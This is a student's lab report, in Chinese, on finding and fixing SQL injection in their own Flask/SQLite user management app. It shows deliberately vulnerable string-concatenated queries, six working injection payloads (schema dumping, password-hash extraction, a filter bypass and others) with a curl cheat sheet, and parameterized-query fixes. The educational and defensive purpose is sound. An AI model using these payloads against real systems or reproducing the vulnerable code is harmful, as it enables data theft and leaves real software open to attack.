# DAY3-用户管理系统——SQL注入漏洞检测与修复报告

**课程名称**：网络安全技术与应用  
**实验项目**：用户信息管理平台（Flask Web应用 + SQLite）  
**实验主题**：SQL注入攻击与防护  
**检测工具**：浏览器、BurpSuite、curl命令行  
**报告人**：敬君琳 
**学号**：2024141530063
**日期**：2026年7月20日

---

## 一、实验背景

本次实验中我在 Day2 已修复的登录功能基础上，为系统新增了**用户注册**和**用户搜索**两个功能模块，数据存储从 Python 字典迁移到了 SQLite 数据库。

在软件开发中，SQL 注入是最常见、最危险的 Web 安全漏洞之一。本次实验中，我们先使用 **f-string 字符串拼接**方式构造 SQL 语句（故意制造漏洞），然后使用课堂所学的 UNION SELECT 等技术进行注入测试，最后通过**参数化查询**进行修复。

---

## 二、Day3 新增功能

### 2.1 功能概览

| 功能 | 路由 | 方法 | 说明 |
|------|------|------|------|
| 用户注册 | `/register` | GET/POST | 用户名、密码、邮箱、手机号注册 |
| 用户搜索 | `/search` | GET | 按用户名或邮箱关键词搜索 |
| 数据库初始化 | `init_db()` | 启动调用 | 创建 users 表，插入默认用户 |

### 2.2 数据库设计

**数据库**：SQLite（`data/users.db`）

**users 表结构**：

| 字段 | 类型 | 约束 |
|------|------|------|
| id | INTEGER | PRIMARY KEY AUTOINCREMENT |
| username | TEXT | UNIQUE NOT NULL |
| password | TEXT | NOT NULL |
| email | TEXT | — |
| phone | TEXT | — |

### 2.3 项目文件结构

```
Day3/
├── app.py                     # Flask 主程序（已修复版本）
├── data/
│   └── users.db               # SQLite 数据库（自动生成）
├── templates/
│   ├── base.html              # 基础模板（导航栏新增"注册"链接）
│   ├── index.html             # 首页（新增搜索框和结果表格）
│   ├── login.html             # 登录页（新增成功提示）
│   └── register.html          # 注册页（新增）
└── static/
    └── css/
        └── style.css          # 样式文件（新增搜索相关样式）
```

---

## 三、漏洞代码分析（修复前）

### 3.1 搜索接口 — LIKE 查询注入点

**漏洞代码**：

```python
@app.route("/search")
def search():
    keyword = request.args.get("keyword", "")
    # ...
    if keyword:
        # ⚠️ f-string 拼接，存在 SQL 注入
        sql = (
            f"SELECT * FROM users "
            f"WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
        )
        print(f"[SEARCH SQL] {sql}")
        cursor.execute(sql)
```

**漏洞原理**：

用户输入的 `keyword` 通过 URL 参数传入后，使用 f-string 直接拼接到 SQL 语句中，没有任何过滤或转义。攻击者可以构造恶意 `keyword` 值，闭合前面的单引号和 LIKE 通配符后，追加 UNION SELECT 语句。

**原始 SQL 逻辑**：

```sql
SELECT * FROM users WHERE username LIKE '%用户输入%' OR email LIKE '%用户输入%'
```

攻击者输入 `admin' UNION SELECT 1,2,3,4,5--` 后，SQL 变为：

```sql
SELECT * FROM users WHERE username LIKE '%admin' UNION SELECT 1,2,3,4,5--%' OR email LIKE ...
```

`--` 将后面的内容全部注释掉，UNION SELECT 被成功执行。

### 3.2 注册接口 — INSERT 语句注入点

**漏洞代码**：

```python
@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form.get("username", "")
        # ...
        # ⚠️ f-string 拼接，存在 SQL 注入
        sql = (
            f"INSERT INTO users (username, password, email, phone) "
            f"VALUES ('{username}', '{hashed_pw}', '{email}', '{phone}')"
        )
        cursor.execute(sql)
```

**漏洞原理**：

用户名通过 POST 表单传入后直接拼接进 INSERT 语句。攻击者可以在用户名字段中闭合单引号，插入任意 VALUES，并用 `--` 注释掉原本的后续值。

---

## 四、SQL 注入攻击测试

### 4.1 测试环境

```bash
cd Day3
python app.py
# 服务运行在 http://127.0.0.1:5000
```

### 4.2 攻击一：UNION SELECT 列数探测

**目的**：确定 users 表的列数，为后续注入做准备。

**Payload**：
```
keyword=admin' UNION SELECT 1,2,3,4,5--
```

**URL 编码后**：
```
/search?keyword=admin%27%20UNION%20SELECT%201,2,3,4,5--
```

**实际执行的 SQL**：
```sql
SELECT * FROM users WHERE username LIKE '%admin' UNION SELECT 1,2,3,4,5--%' OR email LIKE ...
```

**结果**：注入成功！页面在搜索结果中显示了 `1, 2, 4, 5`（第3列是password，模板未渲染），确认 users 表有 5 列。

**控制台输出**：
```
[SEARCH SQL] SELECT * FROM users WHERE username LIKE '%admin' UNION SELECT 1,2,3,4,5--%' OR email LIKE '%admin' UNION SELECT 1,2,3,4,5--%'
```

### 4.3 攻击二：获取数据库表结构

**目的**：从 `sqlite_master` 系统表获取完整的建表语句。

**Payload**：
```
keyword=x' UNION SELECT 1,type,name,sql,5 FROM sqlite_master--
```

**结果**：成功获取到完整的 CREATE TABLE 语句：
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    email TEXT,
    phone TEXT
)
```

同时获取到了 `sqlite_sequence` 系统表的结构信息。

### 4.4 攻击三：批量拖取密码哈希

**目的**：获取所有用户的密码哈希值。

**Payload**：
```
keyword=x' UNION SELECT id,username,'--',password,phone FROM users--
```

**结果**： 成功获取所有用户密码哈希：
```
admin: scrypt:32768:8:1$gOAd0wg2hWzWN6K5$bb787a29...
alice: scrypt:32768:8:1$ApSxhwMd3Sl2AmBc$96ac5f48...
```

虽然 scrypt 哈希难以破解，但攻击者获取到了完整的哈希值，可以离线暴力破解。

### 4.5 攻击四：万能查询 — 绕过登录态获取全量数据

**目的**：使用 OR 1=1 永真条件绕过 LIKE 匹配，获取所有用户。

**Payload**：
```
keyword=%' OR 1=1--
```

**URL 编码后**：
```
/search?keyword=%25%27%20OR%201=1--
```

**实际执行的 SQL**：
```sql
SELECT * FROM users WHERE username LIKE '%%' OR 1=1--%' OR email LIKE ...
```

**结果**：所有用户数据全部返回（包括通过注入插入的 hacker 用户）。

### 4.6 攻击五：注册接口 INSERT 注入

**目的**：通过注册表单插入恶意数据。

**Payload**（在用户名字段）：
```
hacker', 'fakehash', 'hack@evil.com', '666666'); --
```

**实际执行的 SQL**：
```sql
INSERT INTO users (username, password, email, phone) 
VALUES ('hacker', 'fakehash', 'hack@evil.com', '666666'); --', '...', '...', '...')
```

**结果**：成功在数据库中插入了一条攻击者控制的记录（id=5, username=hacker, password=fakehash），且密码绕过了哈希处理。

### 4.7 攻击六：简单 WAF 绕过

**目的**：演示绕过简单的空格过滤。

**Payload**（使用 `/**/` 替代空格）：
```
keyword=admin'/**/UNION/**/SELECT/**/1,2,3,4,5--
```

**结果**：注入成功，`/**/` 在 SQLite 中被解析为空白，效果等同于空格。

---

## 五、SQL 注入攻击汇总

| 编号 | 攻击名称 | 注入类型 | Payload 示例 | 结果 |
|:----:|----------|----------|-------------|:----:|
| ① | 列数探测 | UNION SELECT | `admin' UNION SELECT 1,2,3,4,5--` | 成功 |
| ② | 表结构获取 | UNION + sqlite_master | `x' UNION SELECT 1,type,name,sql,5 FROM sqlite_master--` | 成功 |
| ③ | 密码哈希提取 | UNION SELECT | `x' UNION SELECT id,username,'--',password,phone FROM users--` | 成功 |
| ④ | 全量数据拖取 | OR 永真条件 | `%' OR 1=1--` | 成功 |
| ⑤ | INSERT 注入 | 注册表单注入 | `hacker', 'fakehash', ..., '...'); --` | 成功 |
| ⑥ | WAF 空格绕过 | /**/ 注释替换 | `admin'/**/UNION/**/SELECT/**/1,2,3,4,5--` | 成功 |

---

## 六、漏洞修复方案

### 6.1 核心修复：参数化查询（Parameterized Query）

**原理**：将 SQL 语句结构与数据参数分离。SQL 语句中使用 `?` 占位符，数据通过参数元组传递给 `execute()`。数据库驱动会自动对参数值进行转义，确保参数永远不会被解释为 SQL 代码。

**关键区别**：

| 方式 | 代码示例 | 安全性 |
|------|---------|:------:|
| f-string 拼接 | `f"SELECT * FROM users WHERE username = '{username}'"` | 不安全 |
| 参数化查询 | `"SELECT * FROM users WHERE username = ?", (username,)` | 安全 |

### 6.2 修复代码对比

#### 6.2.1 搜索接口

```python
# 修复前（不安全 — f-string 拼接）
sql = (
    f"SELECT * FROM users "
    f"WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
)
cursor.execute(sql)

# 修复后（安全 — 参数化查询）
sql = "SELECT * FROM users WHERE username LIKE ? OR email LIKE ?"
params = (f"%{keyword}%", f"%{keyword}%")
cursor.execute(sql, params)
```

**注意**：LIKE 的 `%` 通配符在参数值中拼接（`f"%{keyword}%"`），这是安全的，因为 `%` 不是 SQL 特殊字符，不会被当作代码执行。用户输入中的单引号等特殊字符会被数据库驱动自动转义。

#### 6.2.2 注册接口

```python
# 修复前（不安全 — f-string 拼接）
sql = (
    f"INSERT INTO users (username, password, email, phone) "
    f"VALUES ('{username}', '{hashed_pw}', '{email}', '{phone}')"
)
cursor.execute(sql)

# 修复后（安全 — 参数化查询）
sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
params = (username, hashed_pw, email, phone)
cursor.execute(sql, params)
```

#### 6.2.3 数据库初始化

```python
# 修复前（不安全 — f-string 拼接）
cursor.execute(
    f"INSERT OR IGNORE INTO users (username, password, email, phone) "
    f"VALUES ('admin', '{admin_pw}', 'admin@example.com', '13800138000')"
)

# 修复后（安全 — 参数化查询）
cursor.execute(
    "INSERT OR IGNORE INTO users (username, password, email, phone) "
    "VALUES (?, ?, ?, ?)",
    ("admin", admin_pw, "admin@example.com", "13800138000")
)
```

### 6.3 修复验证

修复后，使用相同 payload 进行攻击测试：

```bash
# 测试 UNION SELECT — 被当作字面搜索词，返回"无搜索结果"
curl "http://127.0.0.1:5000/search?keyword=admin' UNION SELECT 1,2,3,4,5--"
# → "无搜索结果"

# 测试注册注入 — payload 被当作普通用户名原样存储
curl -X POST "http://127.0.0.1:5000/register" \
  -d "username=hack', 'bad', 'e@e.com', '9'); --&password=x&email=t@t.com&phone=1"
# → 用户名被存储为：hack', 'bad', 'e@e.com', '9'); --
# → email 和 phone 字段正确对应表单中的值
```

**结论**：所有 SQL 注入 payload 均失效，参数化查询成功防御了 SQL 注入攻击。

---

## 七、修复前后对比总结

| 对比项 | 修复前 | 修复后 |
|--------|--------|--------|
| SQL 构造方式 | f-string 字符串拼接 | 参数化查询（? 占位符） |
| 用户输入处理 | 无过滤，直接拼接进 SQL | 作为参数传递，驱动自动转义 |
| 搜索 UNION SELECT | 可成功注入 | 注入失效 |
| 搜索 OR 永真条件 | 可批量拖取数据 | 注入失效 |
| 注册 INSERT 注入 | 可插入恶意数据 | 注入失效 |
| 密码绕过 | 可通过注入绕过哈希 | 无法绕过 |
| 表结构泄露 | sqlite_master 可读 | 无法通过注入读取 |
| WAF 绕过 | /**/ 可替代空格 | 注入本身已失效 |
| 正常功能 | 正常 | 正常（不受影响） |

---

## 八、SQL 注入防护最佳实践

通过本次实验，总结以下防护原则：

### 8.1 第一道防线：参数化查询（本次使用）

- **永远不要**使用字符串拼接或 f-string 构造 SQL 语句
- **始终使用**参数化查询（`?` 占位符 + 参数元组）
- LIKE 语句的通配符 `%` 在参数值中拼接是安全的

### 8.2 其他重要防护措施（课堂延伸）

| 措施 | 说明 |
|------|------|
| **输入校验** | 对用户输入做白名单校验（如用户名只允许字母数字） |
| **最小权限** | 数据库账号只授予必要的权限（应用账号不应有 DROP 权限） |
| **错误处理** | 不向前端返回详细的数据库错误信息 |
| **WAF** | 部署 Web 应用防火墙，拦截常见注入 payload |

### 8.3 为什么不用"黑名单过滤"？

有些同学可能会想"把单引号过滤掉不就行了？"但实际上：

1. **绕过方式太多**：`/**/`、双重编码、大小写变换、Hex 编码等
2. **误伤正常输入**：姓名 `O'Brien` 需要单引号
3. **维护成本高**：黑名单永远追不上攻击手法

参数化查询从**根本上**解决了问题——数据和代码分离，数据永远不会被当作代码执行。

---

## 九、实验总结

通过本次实验，我对 SQL 注入有了从理论到实践的完整认识：

1. **SQL 注入危害极大** —— 通过一个简单的搜索框，就能获取数据库的所有表结构、用户密码哈希，甚至插入恶意数据。攻击成本极低，但后果严重。

2. **字符串拼接是万恶之源** —— 只要用户输入与 SQL 语句通过字符串拼接混在一起，注入就是不可避免的。f-string、`+`、`%` 格式化都是一样的危险。

3. **参数化查询是一劳永逸的解决方案** —— 将 SQL 结构与数据参数分离后，无论用户输入什么特殊字符（单引号、`--`、`UNION`），都只会被当作普通数据，不会被解析为 SQL 关键字。

4. **安全意识要从编码阶段开始** —— 不能等系统上线了再去找漏洞、打补丁。在写每一行 SQL 代码的时候，都要问自己："这里有没有用参数化查询？"

5. **学到的注入技术** —— UNION SELECT 列数探测、sqlite_master 表结构获取、OR 永真条件万能查询、INSERT 语句注入、`/**/` 空格绕过等，这些技术加深了我对 SQL 注入原理的理解。

---

## 十、项目文件清单

```
Day3/
├── app.py                     # 已修复 - 全部使用参数化查询
├── data/                      # 数据库目录（自动创建）
│   └── users.db               # SQLite 数据库文件
├── templates/
│   ├── base.html              # 基础模板（导航栏新增"注册"链接）
│   ├── index.html             # 首页（新增搜索功能和结果表格）
│   ├── login.html             # 登录页（新增注册成功提示）
│   └── register.html          # 注册页（新增）
└── static/
    └── css/
        └── style.css          # 样式文件（新增搜索、成功提示样式）
```

### 启动方式

```bash
cd Day3
python app.py
```

访问 http://localhost:5000 ，预设登录账号 `admin / admin123` 和 `alice / alice2025`。

---

## 附录：SQL 注入测试命令速查

```bash
# 基础搜索
curl "http://127.0.0.1:5000/search?keyword=admin"

# 列数探测 (URL编码后)
curl "http://127.0.0.1:5000/search?keyword=admin%27%20UNION%20SELECT%201,2,3,4,5--"

# 获取表结构
curl "http://127.0.0.1:5000/search?keyword=x%27%20UNION%20SELECT%201,type,name,sql,5%20FROM%20sqlite_master--"

# 拖取密码哈希
curl "http://127.0.0.1:5000/search?keyword=x%27%20UNION%20SELECT%20id,username,%27--%27,password,phone%20FROM%20users--"

# 万能查询
curl "http://127.0.0.1:5000/search?keyword=%25%27%20OR%201=1--"

# WAF空格绕过
curl "http://127.0.0.1:5000/search?keyword=admin%27/**/UNION/**/SELECT/**/1,2,3,4,5--"

# 注册注入
curl -X POST "http://127.0.0.1:5000/register" \
  -d "username=hack', 'hash', 'e@e.com', '9'); --&password=x&email=t@t.com&phone=1"
```
